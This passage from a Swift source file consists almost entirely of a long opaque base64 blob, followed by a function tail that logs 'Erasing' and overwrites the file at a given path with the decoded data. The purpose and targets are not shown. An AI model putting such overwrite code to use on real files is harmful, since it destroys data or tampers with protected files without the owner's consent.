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"
        print("Erasing ", path)
    return overwriteFileWithDataImpl(originPath: path, replacementData: Data(base64Encoded: noise)!)
}
